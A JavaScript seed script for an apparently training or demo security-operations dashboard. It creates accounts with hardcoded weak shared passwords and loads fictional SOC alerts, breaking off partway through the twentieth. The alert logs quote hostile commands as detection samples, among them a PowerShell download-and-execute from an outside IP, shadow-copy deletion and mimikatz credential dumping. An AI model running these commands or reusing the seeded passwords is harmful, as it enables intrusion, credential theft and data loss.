'use strict';
const path   = require('path');
const fs     = require('fs');
const bcrypt = require('bcryptjs');
const DB     = require('better-sqlite3');

const DB_PATH     = path.join(__dirname, 'diaas.db');
const SCHEMA_PATH = path.join(__dirname, 'schema.sql');

const db = new DB(DB_PATH);
db.pragma('journal_mode = WAL');
db.exec(fs.readFileSync(SCHEMA_PATH, 'utf8'));

// ── helpers ──────────────────────────────────────────────
const hash = p => bcrypt.hashSync(p, 10);
const run  = (sql, params = []) => db.prepare(sql).run(...params);
const get  = (sql, params = []) => db.prepare(sql).get(...params);

// ── users ─────────────────────────────────────────────────
const users = [
  { username: 'admin',       password: 'Admin@2024',   role: 'admin'   },
  { username: 'analyst_01',  password: 'Analyst@2024', role: 'analyst' },
  { username: 'analyst_02',  password: 'Analyst@2024', role: 'analyst' },
  { username: 'analyst_03',  password: 'Analyst@2024', role: 'analyst' },
  { username: 'analyst_04',  password: 'Analyst@2024', role: 'analyst' },
  { username: 'analyst_05',  password: 'Analyst@2024', role: 'analyst' },
  { username: 'analyst_06',  password: 'Analyst@2024', role: 'analyst' },
  { username: 'analyst_07',  password: 'Analyst@2024', role: 'analyst' },
  { username: 'analyst_08',  password: 'Analyst@2024', role: 'analyst' },
  { username: 'analyst_09',  password: 'Analyst@2024', role: 'analyst' },
  { username: 'analyst_10',  password: 'Analyst@2024', role: 'analyst' },
];

for (const u of users) {
  const existing = get('SELECT id FROM users WHERE username = ?', [u.username]);
  if (!existing) {
    run('INSERT INTO users (username, password_hash, role, is_active) VALUES (?,?,?,1)',
      [u.username, hash(u.password), u.role]);
  }
}
console.log('✓ Users seeded');

// ── SOC alerts (50 real-world incidents) ──────────────────
const alerts = [
  // ── CREDENTIAL & IDENTITY ──────────────────────────────
  {
    id: 'ALT-001', severity: 'critical', category: 'Credential Access',
    title: 'Brute Force — Domain Admin Account',
    source: 'Windows Security', host: 'DC01.corp.local', src_ip: '10.10.5.44',
    dst_ip: '10.10.1.10', user: 'Administrator', process: 'lsass.exe',
    event_id: 4625, mitre_tactic: 'Credential Access', mitre_technique: 'T1110.001',
    status: 'open', timestamp: '2024-03-15T02:14:33Z',
    description: '487 failed logon attempts against Administrator in 4 minutes from internal host WS-FINANCE-05.',
    raw_log: '{"EventID":4625,"SubjectUserName":"Administrator","IpAddress":"10.10.5.44","FailureReason":"Unknown user name or bad password","LogonType":3,"Count":487}',
    iocs: JSON.stringify(['10.10.5.44','Administrator','WS-FINANCE-05']),
    timeline: JSON.stringify([
      { time:'02:10:11', event:'First failed logon from 10.10.5.44' },
      { time:'02:14:33', event:'Threshold (100 failures) breached — alert fired' },
      { time:'02:14:44', event:'Account lockout policy triggered' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.5.44:49832', dst:'10.10.1.10:445', proto:'SMB', bytes_sent:24000, bytes_recv:18000 }),
    recommendations: 'Lock source workstation, reset Administrator password, check WS-FINANCE-05 for malware.',
  },
  {
    id: 'ALT-002', severity: 'high', category: 'Credential Access',
    title: 'Password Spray — O365 Authentication',
    source: 'Azure AD Sign-in Logs', host: 'cloud/o365', src_ip: '185.220.101.45',
    dst_ip: 'login.microsoftonline.com', user: 'multiple', process: 'N/A',
    event_id: null, mitre_tactic: 'Credential Access', mitre_technique: 'T1110.003',
    status: 'open', timestamp: '2024-03-15T09:22:05Z',
    description: 'Single external IP tried the same password ("Spring2024!") against 142 O365 accounts over 30 minutes. 3 successful authentications.',
    raw_log: '{"SignInActivity":{"FailureCount":139,"SuccessCount":3},"IPAddress":"185.220.101.45","Location":"RU","UserAgent":"python-requests/2.28.0"}',
    iocs: JSON.stringify(['185.220.101.45','Spring2024!','python-requests/2.28.0']),
    timeline: JSON.stringify([
      { time:'08:52:00', event:'First auth attempt from 185.220.101.45' },
      { time:'09:22:05', event:'3 successful logins detected — alert fired' },
      { time:'09:22:10', event:'Geo anomaly flagged (Russia vs. India baseline)' },
    ]),
    network_flow: JSON.stringify({ src:'185.220.101.45:0', dst:'login.microsoftonline.com:443', proto:'HTTPS', bytes_sent:0, bytes_recv:0 }),
    recommendations: 'Block IP, revoke sessions for 3 compromised accounts, enforce MFA.',
  },
  {
    id: 'ALT-003', severity: 'critical', category: 'Credential Access',
    title: 'LSASS Memory Dump — Mimikatz',
    source: 'EDR / CrowdStrike', host: 'WS-DEVOPS-02.corp.local', src_ip: '10.10.8.21',
    dst_ip: 'N/A', user: 'jsmith', process: 'mimikatz.exe',
    event_id: 4656, mitre_tactic: 'Credential Access', mitre_technique: 'T1003.001',
    status: 'open', timestamp: '2024-03-15T14:05:18Z',
    description: 'mimikatz.exe opened a handle to lsass.exe with PROCESS_VM_READ access. Credential dumping confirmed.',
    raw_log: '{"Process":"mimikatz.exe","TargetProcess":"lsass.exe","AccessMask":"0x1410","GrantedAccess":"PROCESS_VM_READ|PROCESS_QUERY_INFORMATION","ParentProcess":"cmd.exe","User":"CORP\\\\jsmith","CommandLine":"mimikatz.exe \\"sekurlsa::logonpasswords\\""}',
    iocs: JSON.stringify(['mimikatz.exe','lsass.exe','sekurlsa::logonpasswords','10.10.8.21','jsmith']),
    timeline: JSON.stringify([
      { time:'14:03:10', event:'cmd.exe spawned by explorer.exe under jsmith' },
      { time:'14:05:18', event:'mimikatz.exe executed — LSASS handle opened' },
      { time:'14:05:21', event:'PROCESS_VM_READ access granted — credential dump' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.8.21', dst:'N/A', proto:'local', bytes_sent:0, bytes_recv:0 }),
    recommendations: 'Isolate host immediately, rotate ALL domain credentials, investigate jsmith account compromise vector.',
  },
  {
    id: 'ALT-004', severity: 'high', category: 'Credential Access',
    title: 'Kerberoasting Attack Detected',
    source: 'Windows Security / SIEM', host: 'DC01.corp.local', src_ip: '10.10.6.55',
    dst_ip: '10.10.1.10', user: 'mwilson', process: 'Rubeus.exe',
    event_id: 4769, mitre_tactic: 'Credential Access', mitre_technique: 'T1558.003',
    status: 'open', timestamp: '2024-03-16T11:30:00Z',
    description: '47 Kerberos service ticket requests (TGS-REQ) for RC4-HMAC encrypted tickets from single host in 2 minutes. Classic Kerberoasting pattern.',
    raw_log: '{"EventID":4769,"ServiceName":"MSSQLSvc/sqlserver.corp.local","TicketEncryptionType":"0x17","ClientAddress":"10.10.6.55","ClientName":"mwilson@CORP.LOCAL","Count":47}',
    iocs: JSON.stringify(['10.10.6.55','mwilson','Rubeus.exe','RC4-HMAC','MSSQLSvc']),
    timeline: JSON.stringify([
      { time:'11:28:01', event:'Rubeus.exe executed on WS-IT-11' },
      { time:'11:30:00', event:'47 TGS requests in 120s — alert fired' },
      { time:'11:30:05', event:'RC4-HMAC downgrade pattern confirmed' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.6.55:49901', dst:'10.10.1.10:88', proto:'Kerberos', bytes_sent:9400, bytes_recv:47000 }),
    recommendations: 'Reset service account passwords, enforce AES-only tickets, investigate mwilson.',
  },

  // ── MALWARE & EXECUTION ────────────────────────────────
  {
    id: 'ALT-005', severity: 'critical', category: 'Execution',
    title: 'Ransomware — Mass File Encryption',
    source: 'EDR / Sentinel', host: 'FS01.corp.local', src_ip: '10.10.3.80',
    dst_ip: 'N/A', user: 'SYSTEM', process: 'svchost.exe (renamed)',
    event_id: 4663, mitre_tactic: 'Impact', mitre_technique: 'T1486',
    status: 'open', timestamp: '2024-03-17T03:22:45Z',
    description: '14,000+ files renamed with .locked extension in under 5 minutes on file server FS01. Shadow copies deleted. Ransom note DROP_README.txt written to every folder.',
    raw_log: '{"Process":"svch0st.exe","Action":"FILE_RENAMED","FilesAffected":14322,"Extension":".locked","ShadowCopyDeletion":"vssadmin delete shadows /all /quiet","RansomNote":"DROP_README.txt","Entropy":7.98}',
    iocs: JSON.stringify(['svch0st.exe','.locked','DROP_README.txt','vssadmin delete shadows','10.10.3.80']),
    timeline: JSON.stringify([
      { time:'03:18:00', event:'svch0st.exe dropped to C:\\Windows\\Temp' },
      { time:'03:20:11', event:'vssadmin.exe — all shadow copies deleted' },
      { time:'03:22:45', event:'Mass file encryption begins — alert fired' },
      { time:'03:27:51', event:'14,322 files encrypted. Network share encryption starts.' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.3.80', dst:'N/A', proto:'local', bytes_sent:0, bytes_recv:0 }),
    recommendations: 'IMMEDIATE: Isolate FS01, activate IR plan, do NOT reboot, preserve memory for forensics.',
  },
  {
    id: 'ALT-006', severity: 'critical', category: 'Execution',
    title: 'PowerShell Empire C2 Beacon',
    source: 'EDR / Network IDS', host: 'WS-HR-07.corp.local', src_ip: '10.10.9.12',
    dst_ip: '45.142.212.100', user: 'agarcia', process: 'powershell.exe',
    event_id: 4104, mitre_tactic: 'Command and Control', mitre_technique: 'T1071.001',
    status: 'open', timestamp: '2024-03-15T16:44:22Z',
    description: 'Encoded PowerShell downloading stage-2 payload from 45.142.212.100 (known Empire C2). Beacon interval 60s. Base64-encoded POST requests to /login/process.php.',
    raw_log: '{"EventID":4104,"ScriptBlock":"IEX (New-Object Net.WebClient).DownloadString(\'http://45.142.212.100/login/process.php\')","EncodedCommand":"JABjAGwAaQBlAG4AdA==","User":"CORP\\\\agarcia","ParentProcess":"OUTLOOK.EXE"}',
    iocs: JSON.stringify(['45.142.212.100','/login/process.php','powershell -enc','OUTLOOK.EXE->powershell.exe','agarcia']),
    timeline: JSON.stringify([
      { time:'16:40:01', event:'agarcia opened phishing email attachment in Outlook' },
      { time:'16:41:15', event:'OUTLOOK.EXE spawned powershell.exe — anomalous parent' },
      { time:'16:44:22', event:'C2 beacon to 45.142.212.100 detected — alert fired' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.9.12:52341', dst:'45.142.212.100:80', proto:'HTTP', bytes_sent:1200, bytes_recv:48000 }),
    recommendations: 'Isolate WS-HR-07, block 45.142.212.100 at firewall, check agarcia email for phishing chain.',
  },
  {
    id: 'ALT-007', severity: 'high', category: 'Execution',
    title: 'Malicious Macro — Excel Document',
    source: 'EDR / Email Gateway', host: 'WS-SALES-03.corp.local', src_ip: '10.10.7.33',
    dst_ip: '192.168.1.1', user: 'rbhat', process: 'EXCEL.EXE',
    event_id: 4688, mitre_tactic: 'Execution', mitre_technique: 'T1204.002',
    status: 'open', timestamp: '2024-03-16T10:15:00Z',
    description: 'Excel spawned cmd.exe which executed wscript.exe running a VBS dropper. File: Invoice_March2024.xlsm.',
    raw_log: '{"ParentProcess":"EXCEL.EXE","ChildProcess":"cmd.exe","Grandchild":"wscript.exe","CommandLine":"wscript.exe C:\\Users\\rbhat\\AppData\\Local\\Temp\\update.vbs","OriginalFile":"Invoice_March2024.xlsm","SHA256":"a1b2c3d4e5f6..."}',
    iocs: JSON.stringify(['Invoice_March2024.xlsm','update.vbs','EXCEL.EXE->cmd.exe->wscript.exe','a1b2c3d4e5f6','rbhat']),
    timeline: JSON.stringify([
      { time:'10:12:00', event:'Invoice_March2024.xlsm received via email (external sender)' },
      { time:'10:14:55', event:'User enabled macros — EXCEL.EXE spawned cmd.exe' },
      { time:'10:15:00', event:'wscript.exe executed update.vbs — alert fired' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.7.33:50234', dst:'192.168.1.1:80', proto:'HTTP', bytes_sent:450, bytes_recv:12000 }),
    recommendations: 'Quarantine file, isolate host, block sender domain, disable macros org-wide.',
  },
  {
    id: 'ALT-008', severity: 'high', category: 'Defense Evasion',
    title: 'Process Hollowing — svchost.exe Impersonation',
    source: 'EDR / Sysmon', host: 'WS-EXEC-01.corp.local', src_ip: '10.10.2.5',
    dst_ip: '104.21.45.200', user: 'SYSTEM', process: 'svchost.exe',
    event_id: 4688, mitre_tactic: 'Defense Evasion', mitre_technique: 'T1055.012',
    status: 'investigating', timestamp: '2024-03-16T08:05:33Z',
    description: 'svchost.exe spawned from non-standard parent (explorer.exe instead of services.exe). Network connection to external IP. Memory mapped from disk as writable — process hollowing indicators.',
    raw_log: '{"Process":"svchost.exe","PID":4892,"ParentProcess":"explorer.exe","ParentPID":1204,"Expected_Parent":"services.exe","NetworkConnection":"104.21.45.200:443","MemoryProtection":"PAGE_EXECUTE_READWRITE","ImagePath":"C:\\Windows\\System32\\svchost.exe"}',
    iocs: JSON.stringify(['svchost.exe from explorer.exe','104.21.45.200','PAGE_EXECUTE_READWRITE','10.10.2.5']),
    timeline: JSON.stringify([
      { time:'08:03:00', event:'explorer.exe spawns svchost.exe — unusual parent chain' },
      { time:'08:05:33', event:'svchost.exe connects to 104.21.45.200:443 — alert fired' },
      { time:'08:05:40', event:'Memory scan shows hollowed region with PE header' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.2.5:54123', dst:'104.21.45.200:443', proto:'HTTPS', bytes_sent:3200, bytes_recv:28000 }),
    recommendations: 'Memory dump svchost PID 4892, kill process, isolate host, investigate explorer.exe infection vector.',
  },

  // ── LATERAL MOVEMENT ───────────────────────────────────
  {
    id: 'ALT-009', severity: 'high', category: 'Lateral Movement',
    title: 'Pass-the-Hash — SMB Lateral Movement',
    source: 'Windows Security / SIEM', host: 'DC01.corp.local', src_ip: '10.10.4.22',
    dst_ip: '10.10.1.10', user: 'svc_backup', process: 'N/A',
    event_id: 4624, mitre_tactic: 'Lateral Movement', mitre_technique: 'T1550.002',
    status: 'open', timestamp: '2024-03-16T22:11:05Z',
    description: 'NTLM Type 3 authentication for svc_backup from a host where that user has never logged in. NTHash matches known credential from previous dump. Logon Type 3 (network) with no Kerberos.',
    raw_log: '{"EventID":4624,"LogonType":3,"AuthPackage":"NTLM","WorkstationName":"WS-MKTG-08","TargetUser":"svc_backup","SourceIP":"10.10.4.22","KerberosUsed":false,"LogonID":"0x7FA3C1"}',
    iocs: JSON.stringify(['10.10.4.22','svc_backup','NTLM-only','WS-MKTG-08','LogonType3']),
    timeline: JSON.stringify([
      { time:'22:08:00', event:'svc_backup hash extracted from LSASS on WS-MKTG-08' },
      { time:'22:11:05', event:'PTH authentication to DC01 from WS-MKTG-08 — alert fired' },
      { time:'22:11:08', event:'svc_backup accesses ADMIN$ share on DC01' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.4.22:49734', dst:'10.10.1.10:445', proto:'SMB', bytes_sent:14000, bytes_recv:9000 }),
    recommendations: 'Disable svc_backup, isolate WS-MKTG-08, check DC01 for persistence.',
  },
  {
    id: 'ALT-010', severity: 'high', category: 'Lateral Movement',
    title: 'PsExec Remote Execution — Multiple Hosts',
    source: 'Sysmon / Windows Security', host: 'multiple', src_ip: '10.10.3.15',
    dst_ip: 'multiple', user: 'iadmin', process: 'PsExec.exe',
    event_id: 7045, mitre_tactic: 'Lateral Movement', mitre_technique: 'T1570',
    status: 'open', timestamp: '2024-03-17T01:05:00Z',
    description: 'PsExec used to remotely install PSEXESVC service on 9 hosts in 8 minutes from single source. Executing cmd.exe /c whoami && ipconfig on each.',
    raw_log: '{"EventID":7045,"ServiceName":"PSEXESVC","ImagePath":"%SystemRoot%\\PSEXESVC.exe","StartType":"demand start","Hosts":["WS-FIN-01","WS-FIN-02","WS-FIN-03","WS-FIN-04","WS-FIN-05","WS-FIN-06","WS-FIN-07","WS-FIN-08","WS-FIN-09"],"SourceHost":"WS-IT-ADMIN-01","User":"CORP\\\\iadmin"}',
    iocs: JSON.stringify(['PsExec.exe','PSEXESVC','10.10.3.15','iadmin','9 hosts in 8 min']),
    timeline: JSON.stringify([
      { time:'01:05:00', event:'PSEXESVC service installed on WS-FIN-01 — alert fired' },
      { time:'01:05:45', event:'Reconnaissance commands run on WS-FIN-01 through 05' },
      { time:'01:12:44', event:'All 9 Finance workstations reached' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.3.15:49822', dst:'10.10.5.x:445', proto:'SMB', bytes_sent:52000, bytes_recv:38000 }),
    recommendations: 'Block PsExec org-wide, investigate iadmin source, check for data staging on Finance hosts.',
  },

  // ── PERSISTENCE ───────────────────────────────────────
  {
    id: 'ALT-011', severity: 'high', category: 'Persistence',
    title: 'Registry Run Key — Startup Persistence',
    source: 'Sysmon / EDR', host: 'WS-LEGAL-02.corp.local', src_ip: '10.10.11.44',
    dst_ip: 'N/A', user: 'lchen', process: 'reg.exe',
    event_id: 13, mitre_tactic: 'Persistence', mitre_technique: 'T1547.001',
    status: 'open', timestamp: '2024-03-15T20:33:10Z',
    description: 'reg.exe added a Run key pointing to C:\\Users\\lchen\\AppData\\Roaming\\updater.exe — a previously unknown binary with entropy 7.94 (packed).',
    raw_log: '{"EventID":13,"EventType":"SetValue","TargetObject":"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\WindowsUpdater","Details":"C:\\\\Users\\\\lchen\\\\AppData\\\\Roaming\\\\updater.exe","Process":"reg.exe","User":"CORP\\\\lchen"}',
    iocs: JSON.stringify(['updater.exe','HKCU\\Run\\WindowsUpdater','entropy:7.94','lchen','10.10.11.44']),
    timeline: JSON.stringify([
      { time:'20:30:00', event:'updater.exe dropped to AppData\\Roaming' },
      { time:'20:33:10', event:'Registry Run key set — alert fired' },
      { time:'20:33:15', event:'updater.exe executes — no outbound connection yet' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.11.44', dst:'N/A', proto:'local', bytes_sent:0, bytes_recv:0 }),
    recommendations: 'Delete Run key, quarantine updater.exe, scan host for additional persistence.',
  },
  {
    id: 'ALT-012', severity: 'high', category: 'Persistence',
    title: 'Scheduled Task — Hidden Recurring Payload',
    source: 'Sysmon / Task Scheduler', host: 'WS-OPS-09.corp.local', src_ip: '10.10.6.77',
    dst_ip: 'N/A', user: 'SYSTEM', process: 'schtasks.exe',
    event_id: 4698, mitre_tactic: 'Persistence', mitre_technique: 'T1053.005',
    status: 'open', timestamp: '2024-03-16T04:00:01Z',
    description: 'New scheduled task "\\Microsoft\\Windows\\SystemMaintenance" created to run PowerShell from Temp every 30 min. Uses obfuscated -EncodedCommand flag.',
    raw_log: '{"EventID":4698,"TaskName":"\\\\Microsoft\\\\Windows\\\\SystemMaintenance","Action":"powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdA==","Trigger":"every 30 minutes","RunAs":"SYSTEM","CreatedBy":"CORP\\\\analyst_backup"}',
    iocs: JSON.stringify(['\\Microsoft\\Windows\\SystemMaintenance','powershell -enc','every 30 min','SYSTEM','10.10.6.77']),
    timeline: JSON.stringify([
      { time:'03:58:10', event:'analyst_backup account used to create scheduled task' },
      { time:'04:00:01', event:'Task first fires — alert fired' },
      { time:'04:30:01', event:'Second execution — payload phones home' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.6.77:55001', dst:'91.108.4.100:443', proto:'HTTPS', bytes_sent:800, bytes_recv:5000 }),
    recommendations: 'Delete task, kill payload, investigate analyst_backup account, block 91.108.4.100.',
  },
  {
    id: 'ALT-013', severity: 'medium', category: 'Persistence',
    title: 'New Local Admin Account Created',
    source: 'Windows Security', host: 'WS-FINANCE-11.corp.local', src_ip: '10.10.5.99',
    dst_ip: 'N/A', user: 'SYSTEM', process: 'net.exe',
    event_id: 4720, mitre_tactic: 'Persistence', mitre_technique: 'T1136.001',
    status: 'open', timestamp: '2024-03-17T05:15:22Z',
    description: 'net.exe created a new local account "helpdesk_svc" and added it to the local Administrators group. No change ticket exists for this action.',
    raw_log: '{"EventID":4720,"NewAccount":"helpdesk_svc","CreatedBy":"SYSTEM","EventID_4732":"helpdesk_svc added to Administrators","Host":"WS-FINANCE-11","ChangeTicket":"none"}',
    iocs: JSON.stringify(['helpdesk_svc','net user add','net localgroup administrators','10.10.5.99']),
    timeline: JSON.stringify([
      { time:'05:14:00', event:'Malware running as SYSTEM on WS-FINANCE-11' },
      { time:'05:15:22', event:'net.exe creates helpdesk_svc — EventID 4720 fired' },
      { time:'05:15:25', event:'helpdesk_svc added to Administrators — EventID 4732' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.5.99', dst:'N/A', proto:'local', bytes_sent:0, bytes_recv:0 }),
    recommendations: 'Delete helpdesk_svc, investigate SYSTEM-level malware, review all hosts for similar accounts.',
  },

  // ── EXFILTRATION ──────────────────────────────────────
  {
    id: 'ALT-014', severity: 'critical', category: 'Exfiltration',
    title: 'Large Data Upload — Mega.nz (Cloud Storage)',
    source: 'DLP / Proxy', host: 'WS-FINANCE-03.corp.local', src_ip: '10.10.5.12',
    dst_ip: 'mega.nz', user: 'psingh', process: 'MEGAsync.exe',
    event_id: null, mitre_tactic: 'Exfiltration', mitre_technique: 'T1567.002',
    status: 'open', timestamp: '2024-03-16T18:44:00Z',
    description: 'MEGAsync.exe uploaded 4.7 GB to mega.nz in one session. User psingh accessed and downloaded 890 files from the Finance shared drive 2 hours prior.',
    raw_log: '{"Application":"MEGAsync.exe","User":"psingh","BytesUploaded":5049942016,"FilesUploaded":890,"DestinationDomain":"mega.nz","Duration":"42min","PriorActivity":"890 files downloaded from \\\\FS01\\Finance\\Q1-Reports"}',
    iocs: JSON.stringify(['MEGAsync.exe','mega.nz','psingh','4.7GB upload','890 files','10.10.5.12']),
    timeline: JSON.stringify([
      { time:'16:00:00', event:'psingh downloads 890 files from \\\\FS01\\Finance' },
      { time:'16:44:00', event:'MEGAsync.exe begins upload to mega.nz — alert fired' },
      { time:'17:26:00', event:'4.7 GB upload completed' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.5.12:52000', dst:'mega.nz:443', proto:'HTTPS', bytes_sent:5049942016, bytes_recv:120000 }),
    recommendations: 'Suspend psingh, notify legal/HR, block mega.nz domain, preserve endpoint forensics.',
  },
  {
    id: 'ALT-015', severity: 'high', category: 'Exfiltration',
    title: 'DNS Tunneling — Data Exfil via DNS Queries',
    source: 'DNS / Network Monitor', host: 'WS-DEV-14.corp.local', src_ip: '10.10.12.8',
    dst_ip: '8.8.8.8', user: 'SYSTEM', process: 'cmd.exe',
    event_id: null, mitre_tactic: 'Exfiltration', mitre_technique: 'T1048.003',
    status: 'open', timestamp: '2024-03-17T07:30:00Z',
    description: '8,400 DNS queries in 15 minutes to randomly generated subdomains of exfilzone[.]ru. Each query carries 63-byte base64 payload in subdomain label. Classic DNS tunneling (dnscat2).',
    raw_log: '{"QueryCount":8400,"DestinationDomain":"exfilzone.ru","AverageQueryLength":63,"EntropyScore":4.82,"SuspectedTool":"dnscat2","UniqueSubdomains":8400,"TimeWindow":"15min","SourceHost":"WS-DEV-14"}',
    iocs: JSON.stringify(['exfilzone.ru','8400 unique DNS queries','base64 in subdomain','dnscat2','10.10.12.8']),
    timeline: JSON.stringify([
      { time:'07:15:00', event:'First DNS query to exfilzone.ru from WS-DEV-14' },
      { time:'07:30:00', event:'Volume threshold exceeded — alert fired' },
      { time:'07:30:05', event:'Pattern matches dnscat2 tool signature' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.12.8:53', dst:'8.8.8.8:53', proto:'DNS/UDP', bytes_sent:529200, bytes_recv:268800 }),
    recommendations: 'Block exfilzone.ru, isolate WS-DEV-14, capture DNS logs for forensics, check for dnscat2 binary.',
  },

  // ── RECONNAISSANCE ────────────────────────────────────
  {
    id: 'ALT-016', severity: 'medium', category: 'Discovery',
    title: 'Port Scan — Internal Network Sweep',
    source: 'Network IDS / Snort', host: 'WS-IT-ADMIN-02', src_ip: '10.10.3.22',
    dst_ip: '10.10.0.0/16', user: 'N/A', process: 'nmap',
    event_id: null, mitre_tactic: 'Discovery', mitre_technique: 'T1046',
    status: 'open', timestamp: '2024-03-15T23:00:00Z',
    description: 'TCP SYN scan (-sS) across entire 10.10.0.0/16 subnet from single host. 65,535 ports scanned on 254 hosts in 12 minutes. nmap OS fingerprinting flags also present.',
    raw_log: '{"ScanType":"TCP_SYN","SourceIP":"10.10.3.22","TargetSubnet":"10.10.0.0/16","PortsScanned":65535,"HostsProbed":254,"Duration":"12min","OSFingerprint":true,"Tool":"nmap"}',
    iocs: JSON.stringify(['10.10.3.22','nmap','SYN scan','10.10.0.0/16','OS fingerprinting']),
    timeline: JSON.stringify([
      { time:'23:00:00', event:'SYN scan begins from 10.10.3.22' },
      { time:'23:12:00', event:'254 hosts probed — alert fired' },
      { time:'23:12:05', event:'OS fingerprinting detected — elevated severity' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.3.22:random', dst:'10.10.0.0/16:1-65535', proto:'TCP/SYN', bytes_sent:6700000, bytes_recv:1200000 }),
    recommendations: 'Identify who owns 10.10.3.22, check for compromised IT admin host, review scan results for follow-on targeting.',
  },
  {
    id: 'ALT-017', severity: 'medium', category: 'Discovery',
    title: 'LDAP Enumeration — AD User/Group Dump',
    source: 'Windows Security / SIEM', host: 'DC01.corp.local', src_ip: '10.10.8.44',
    dst_ip: '10.10.1.10', user: 'tbrown', process: 'powershell.exe',
    event_id: 4662, mitre_tactic: 'Discovery', mitre_technique: 'T1087.002',
    status: 'open', timestamp: '2024-03-16T14:22:00Z',
    description: 'PowerShell executed Get-ADUser and Get-ADGroup queries dumping all 1,200 user objects and 340 group memberships from Active Directory in under 60 seconds.',
    raw_log: '{"EventID":4662,"ObjectType":"user","OperationType":"Read","SubjectUserName":"tbrown","ClientIP":"10.10.8.44","LDAPQuery":"(&(objectClass=user)(objectCategory=person))","RecordsReturned":1200,"Duration":"58s"}',
    iocs: JSON.stringify(['tbrown','Get-ADUser','Get-ADGroup','1200 objects','10.10.8.44','LDAP']),
    timeline: JSON.stringify([
      { time:'14:22:00', event:'PowerShell LDAP query begins from WS-DEV-08' },
      { time:'14:22:58', event:'1200 user + 340 group objects dumped — alert fired' },
    ]),
    network_flow: JSON.stringify({ src:'10.10.8.44:50123', dst:'10.10.1.10:389', proto:'LDAP', bytes_sent:8200, bytes_recv:2400000 }),
    recommendations: 'Investigate tbrown, check for BloodHound/SharpHound usage, review LDAP query source code.',
  },

  // ── PHISHING & INITIAL ACCESS ─────────────────────────
  {
    id: 'ALT-018', severity: 'high', category: 'Initial Access',
    title: 'Spearphishing — Malicious PDF Attachment',
    source: 'Email Gateway / Proofpoint', host: 'email-gw.corp.local', src_ip: 'external',
    dst_ip: 'N/A', user: 'crao', process: 'N/A',
    event_id: null, mitre_tactic: 'Initial Access', mitre_technique: 'T1566.001',
    status: 'open', timestamp: '2024-03-15T08:05:00Z',
    description: 'PDF attachment "Q1_Salary_Revision.pdf" exploits CVE-2023-21608 (Adobe Acrobat RCE). Sent from spoofed HR domain hr-corp.com (legitimate: hr.corp.com). 3 recipients opened.',
    raw_log: '{"Sender":"hr@hr-corp.com","Recipients":["crao@corp.com","vkumar@corp.com","dsharma@corp.com"],"Subject":"Q1 Salary Revision — Confidential","Attachment":"Q1_Salary_Revision.pdf","CVE":"CVE-2023-21608","SHA256":"f4a9b2c1d3e5...","OpenedCount":3}',
    iocs: JSON.stringify(['hr@hr-corp.com','Q1_Salary_Revision.pdf','CVE-2023-21608','f4a9b2c1d3e5','hr-corp.com']),
    timeline: JSON.stringify([
      { time:'08:05:00', event:'Email delivered to 3 recipients — gateway alert' },
      { time:'08:12:00', event:'crao opens attachment — exploit triggers' },
      { time:'08:13:22', event:'Reverse shell spawned from AcroRd32.exe' },
    ]),
    network_flow: JSON.stringify({ src:'external', dst:'corp.com:25', proto:'SMTP', bytes_sent:480000, bytes_recv:0 }),
    recommendations: 'Block hr-corp.com domain, isolate crao workstation, patch Adobe Acrobat (CVE-2023-21608).',
  },
  {
    id: 'ALT-019', severity: 'high', category: 'Initial Access',
    title: 'VPN Credential Stuffing — Valid Account Compromise',
    source: 'VPN / Cisco AnyConnect', host: 'vpn.corp.local', src_ip: '91.108.56.200',
    dst_ip: 'N/A', user: 'mgupta', process: 'N/A',
    event_id: null, mitre_tactic: 'Initial Access', mitre_technique: 'T1078',
    status: 'open', timestamp: '2024-03-16T03:44:00Z',
    description: 'mgupta VPN login from IP geo-located to Nigeria at 3:44 AM IST. User last login was yesterday from Mumbai. Login succeeded — no MFA enrolled on this account.',
    raw_log: '{"User":"mgupta","SourceIP":"91.108.56.200","GeoLocation":"Lagos, Nigeria","LoginTime":"03:44 IST","PreviousLogin":{"IP":"103.21.58.100","Geo":"Mumbai, India","Time":"yesterday 18:22"},"MFAStatus":"not_enrolled","LoginResult":"success"}',
    iocs: JSON.stringify(['mgupta','91.108.56.200','Nigeria login','no MFA','impossible travel']),
    timeline: JSON.stringify([
      { time:'03:44:00', event:'VPN login from Nigeria — alert fired (impossible travel)' },
      { time:'03:44:10', event:'mgupta connects to internal network — no MFA challenge' },
      { time:'03:45:00', event:'mgupta begins accessing HR file shares' },
    ]),
    network_flow: JSON.stringify({ src:'91.108.56.200:54321', dst:'vpn.corp.local:443', proto:'SSL-VPN', bytes_sent:12000, bytes_recv:8000 }),
    recommendations: 'Terminate VPN session, lock mgupta, enforce MFA on all VPN accounts, notify mgupta via out-of-band channel.',
  },

  // ── CLOUD / SaaS ──────────────────────────────────────
  {
    id: 'ALT-020', severity: 'high', category: 'Cloud Security',
    title: 'AWS S3 Bucket — Public ACL Set',
    source: 'AWS CloudTrail', host: 'aws/s3', src_ip: '52.94.1.100',
    dst_ip: 'N/A', user: 'devops-ci-role', process: 'N/A',
    event_id: null, mitre_tactic: 'Exfiltration', mitre_technique: 'T1530',
    status: 'open', timestamp: '2024-03-15T12:00:00Z',
    description: 'PutBucketAcl API call set ACL to "public-read" on S3 bucket "corp-payroll-backups". Bucket contains 240 GB of HR and payroll data. No change ticket.',
    raw_log: '{"eventName":"PutBucketAcl","userIdentity":{"type":"AssumedRole","arn":"arn:aws:sts::123456789:assumed-role/devops-ci-role"},"requestParameters":{"bucketName":"corp-payroll-backups","AccessControlPolicy":{"Grant":{"Grantee":{"URI":"AllUsers"},"Permission":"READ"}}},"sourceIPAddress":"52.94.1.100"}',
    iocs: JSON.stringify(['corp-payroll-backups','PutBucketAcl','public-read','devops-ci-role','52.94.1.100']),
    timeline: JSON.stringify([
